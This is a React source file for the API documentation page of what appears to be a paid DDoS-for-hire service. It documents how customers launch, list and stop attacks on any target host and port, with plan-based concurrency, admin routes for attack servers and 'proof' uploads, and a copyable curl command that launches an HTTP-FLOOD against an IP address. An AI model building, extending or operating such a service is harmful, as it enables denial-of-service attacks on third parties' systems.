"use client";
import { useState, useEffect } from "react";
import { Copy, Terminal, Bomb, Shield, Key, FileText } from "lucide-react";
import { motion } from "motion/react";
import { slideUp, cardStagger } from "@/lib/motion-variants";
import api from "@/lib/api";

const baseURL = "/api/v1";

const fields = [
  { field: "key", description: "Your API Key", value: "Get it from your profile", required: true },
  { field: "host", description: "Target IP or URL", value: "1.2.3.4 or https://example.com", required: true },
  { field: "port", description: "Target Port", value: "0 - 65535", required: true },
  { field: "time", description: "Duration in seconds", value: "30 or longer", required: true },
  { field: "method", description: "Attack method", value: "see methods below", required: true },
  { field: "concurrents", description: "Concurrent threads", value: "1, 2, 3 (depends on plan)", required: false },
];

const endpoints = [
  { method: "POST", path: "/launch", desc: "Launch an attack", auth: "API Key" },
  { method: "GET", path: "/methods", desc: "List available methods", auth: "API Key" },
  { method: "GET", path: "/ongoing-attacks", desc: "List active attacks", auth: "API Key" },
  { method: "POST", path: "/stop", desc: "Stop an attack", auth: "API Key" },
  { method: "GET", path: "/profile", desc: "Get your profile", auth: "Bearer Token" },
  { method: "PUT", path: "/profile", desc: "Update profile", auth: "Bearer Token" },
  { method: "GET", path: "/servers", desc: "List servers (admin)", auth: "Admin" },
  { method: "POST", path: "/servers", desc: "Add a server (admin)", auth: "Admin" },
  { method: "PATCH", path: "/servers/{id}", desc: "Update a server (admin)", auth: "Admin" },
  { method: "GET", path: "/users", desc: "List users (admin)", auth: "Admin" },
  { method: "POST", path: "/add-user", desc: "Create user (admin)", auth: "Admin" },
  { method: "PUT", path: "/users/{id}", desc: "Update user (admin)", auth: "Admin" },
  { method: "DELETE", path: "/remove-user/{id}", desc: "Delete user (admin)", auth: "Admin" },
  { method: "GET", path: "/plans", desc: "List plans (admin)", auth: "Admin" },
  { method: "POST", path: "/plans", desc: "Create plan (admin)", auth: "Admin" },
  { method: "PUT", path: "/plans/{name}", desc: "Update plan (admin)", auth: "Admin" },
  { method: "DELETE", path: "/plans/{name}", desc: "Delete plan (admin)", auth: "Admin" },
  { method: "GET", path: "/methods", desc: "List methods (admin)", auth: "Admin" },
  { method: "POST", path: "/methods", desc: "Create method (admin)", auth: "Admin" },
  { method: "PUT", path: "/methods/{name}", desc: "Update method (admin)", auth: "Admin" },
  { method: "DELETE", path: "/methods/{name}", desc: "Delete method (admin)", auth: "Admin" },
  { method: "GET", path: "/proofs", desc: "List proof images (admin)", auth: "Admin" },
  { method: "POST", path: "/proofs", desc: "Upload proof (admin)", auth: "Admin" },
  { method: "DELETE", path: "/proofs/{id}", desc: "Delete proof (admin)", auth: "Admin" },
  { method: "GET", path: "/broadcasts", desc: "List broadcasts", auth: "Public" },
  { method: "POST", path: "/broadcasts", desc: "Create broadcast (admin)", auth: "Admin" },
  { method: "DELETE", path: "/broadcasts/{id}", desc: "Delete broadcast (admin)", auth: "Admin" },
  { method: "POST", path: "/generate-key", desc: "Generate API key (admin)", auth: "Admin" },
];

const methodColors: Record<string, string> = {
  GET: "text-[#3fb950]",
  POST: "text-[#e6edf3]",
  PUT: "text-[#d29922]",
  PATCH: "text-[#d29922]",
  DELETE: "text-[#f85149]",
};

export default function ApiDocs() {
  const [copied, setCopied] = useState<string | null>(null);
  const [apiKey, setApiKey] = useState("");

  useEffect(() => {
    const token = localStorage.getItem("token");
    if (!token) return;
    api.get("/profile", { headers: { Authorization: `Bearer ${token}` } })
      .then(r => setApiKey(r.data.api_key || ""))
      .catch(() => {});
  }, []);

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopied(label);
    setTimeout(() => setCopied(null), 2000);
  };

  const curlExample = `# Launch an attack
curl -X POST ${baseURL}/launch \\
  -H "Authorization: Bearer ${apiKey || "YOUR_API_KEY"}" \\
  -H "Content-Type: application/json" \\
  -d '{"host":"1.2.3.4","port":80,"time":60,"method":"HTTP-FLOOD","concurrents":1}'`;

  return (
    <div className="min-h-screen bg-[#0d1117]">
      <div className="max-w-5xl mx-auto px-4 md:px-6 py-6 md:py-8 space-y-6">
        <motion.div variants={slideUp} initial="initial" animate="animate">
          <div className="flex items-center gap-3 mb-1">
            <Terminal size={20} className="text-[#e6edf3]" />
            <h1 className="text-lg font-semibold text-[#e6edf3] tracking-tight">API v1 Reference</h1>
          </div>
          <p className="text-sm text-[#8b949e]">Base URL: <code className="text-[#e6edf3] bg-[#161b22] px-1.5 py-0.5 rounded text-xs">{baseURL}</code></p>
        </motion.div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          <motion.div variants={slideUp} initial="initial" animate="animate" className="space-y-4">
            <div>
              <h2 className="text-xs font-medium text-[#8b949e] uppercase tracking-wider mb-2 flex items-center gap-1.5">
                <FileText size={12} /> Attack Fields
              </h2>
              <div className="border border-[#30363d] rounded-lg overflow-hidden">
                <table className="w-full text-sm">
                  <thead>
                    <tr className="border-b border-[#30363d] bg-[#161b22]">
                      <th className="text-left px-3 py-2 text-[#8b949e] font-medium text-xs uppercase tracking-wider">Field</th>
                      <th className="text-left px-3 py-2 text-[#8b949e] font-medium text-xs uppercase tracking-wider">Description</th>
                      <th className="text-left px-3 py-2 text-[#8b949e] font-medium text-xs uppercase tracking-wider">Value</th>
                      <th className="text-left px-3 py-2 text-[#8b949e] font-medium text-xs uppercase tracking-wider">Req</th>
                    </tr>
                  </thead>
                  <tbody>
                    {fields.map((item, i) => (
                      <tr key={i} className="border-t border-[#30363d]/50 hover:bg-[#161b22]/50 transition-colors">
                        <td className="px-3 py-2.5"><code className="text-[#e6edf3] text-xs font-mono">{item.field}</code></td>
                        <td className="px-3 py-2.5 text-[#8b949e] text-xs">{item.description}</td>
                        <td className="px-3 py-2.5 text-[#8b949e] text-xs max-w-[200px] truncate">{item.value}</td>
                        <td className="px-3 py-2.5">{item.required ? <span className="text-[#3fb950] text-xs">Yes</span> : <span className="text-[#8b949e] text-xs">No</span>}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>

            <div>
              <h2 className="text-xs font-medium text-[#8b949e] uppercase tracking-wider mb-2">Example</h2>
              <div className="border border-[#30363d] rounded-lg overflow-hidden bg-[#161b22]">
                <pre className="p-4 text-xs text-[#8b949e] font-mono overflow-x-auto whitespace-pre-wrap">{curlExample}</pre>
                <div className="border-t border-[#30363d] px-4 py-2 flex justify-end">
                  <button
                    onClick={() => copyToClipboard(curlExample, "curl")}
                    className="flex items-center gap-1.5 text-xs text-[#8b949e] hover:text-[#e6edf3] transition-colors"
                  >
                    <Copy size={12} />
                    {copied === "curl" ? "Copied!" : "Copy"}
                  </button>
                </div>
              </div>
            </div>
          </motion.div>

          <motion.div variants={slideUp} initial="initial" animate="animate" className="space-y-4">
            <h2 className="flex items-center gap-2 text-xs font-medium text-[#8b949e] uppercase tracking-wider">
              <Bomb size={13} />
              All Endpoints
            </h2>
            <div className="border border-[#30363d] rounded-lg overflow-hidden max-h-[600px] overflow-y-auto">
              <table className="w-full text-xs">
                <thead>
                  <tr className="border-b border-[#30363d] bg-[#161b22] sticky top-0">
                    <th className="text-left px-3 py-2 text-[#8b949e] font-medium uppercase tracking-wider">Method</th>
                    <th className="text-left px-3 py-2 text-[#8b949e] font-medium uppercase tracking-wider">Path</th>
                    <th className="text-left px-3 py-2 text-[#8b949e] font-medium uppercase tracking-wider">Description</th>
                    <th className="text-left px-3 py-2 text-[#8b949e] font-medium uppercase tracking-wider">Auth</th>
                  </tr>
                </thead>
                <tbody>
                  {endpoints.map((ep, i) => (
                    <tr key={i} className="border-t border-[#30363d]/50 hover:bg-[#161b22]/50 transition-colors">
                      <td className="px-3 py-2">
                        <span className={`font-mono font-medium ${methodColors[ep.method] || "text-[#8b949e]"}`}>{ep.method}</span>
                      </td>
                      <td className="px-3 py-2 font-mono text-[#e6edf3]">{ep.path}</td>
                      <td className="px-3 py-2 text-[#8b949e]">{ep.desc}</td>
                      <td className="px-3 py-2">
                        {ep.auth === "Admin" ? (
                          <span className="inline-flex items-center gap-1 bg-[#d29922]/10 text-[#d29922] px-1.5 py-0.5 rounded text-[10px] font-medium">
                            <Shield size={9} /> Admin
                          </span>
                        ) : (
                          <span className="text-[#8b949e] text-[10px]">{ep.auth}</span>
                        )}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            <div className="border border-[#30363d] rounded-lg bg-[#161b22] p-4 space-y-2">
              <h3 className="text-xs font-medium text-[#e6edf3]">Authentication</h3>
              <p className="text-xs text-[#8b949e]">Use Bearer token in the Authorization header:</p>
              {apiKey ? (
                <div className="flex items-center gap-2 bg-[#0d1117] border border-[#30363d] rounded px-3 py-2">
                  <Key size={14} className="text-[#e6edf3] shrink-0" />
                  <code className="text-xs text-[#e6edf3] font-mono flex-1 truncate">{apiKey}</code>
                  <button
                    onClick={() => copyToClipboard(apiKey, "api-key")}
                    className="flex items-center gap-1 text-xs text-[#8b949e] hover:text-[#e6edf3] transition-colors shrink-0"
                  >
                    <Copy size={12} />
                    {copied === "api-key" ? "Copied!" : "Copy"}
                  </button>
                </div>
              ) : (
                <p className="text-xs text-[#8b949e] italic">Log in to see your API key</p>
              )}
            </div>
          </motion.div>
        </div>
      </div>
    </div>
  );
}
